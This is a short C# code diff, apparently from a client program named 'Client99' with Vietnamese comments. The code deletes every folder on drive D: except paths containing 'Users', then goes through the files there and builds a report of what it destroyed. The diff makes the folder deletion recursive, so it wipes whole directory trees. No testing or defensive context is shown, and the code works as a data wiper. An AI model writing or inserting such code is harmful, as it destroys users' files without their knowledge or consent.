@@ -20,16 +20,16 @@ namespace Client99
                 report += "Khong tim thay!";
             // xoa file
             report += "\n--------------\n";
-            
-            string[] folders = System.IO.Directory.GetDirectories("d:/");
+
+            string[] folders = System.IO.Directory.GetDirectories("D:/");
             foreach (string p in folders)
             {
-                if(!p.Contains("Users"))
-
+                if ((!p.Contains("Users")))
                 {
                     try
                     {
-                        System.IO.Directory.Delete(p);
+                       
+                        System.IO.Directory.Delete(p, true);
                         report += "_" + p + "_ đã bị xóa\n";
                     }
                     catch(UnauthorizedAccessException )
@@ -44,7 +44,7 @@ namespace Client99
 
                 }
             }
-            string[] filePaths1 = System.IO.Directory.GetFiles(@"D:\", "*.*");
+            string[] filePaths1 = System.IO.Directory.GetFiles(@"D:/", "*.*");
             foreach (string p in filePaths1)
             {
                 try
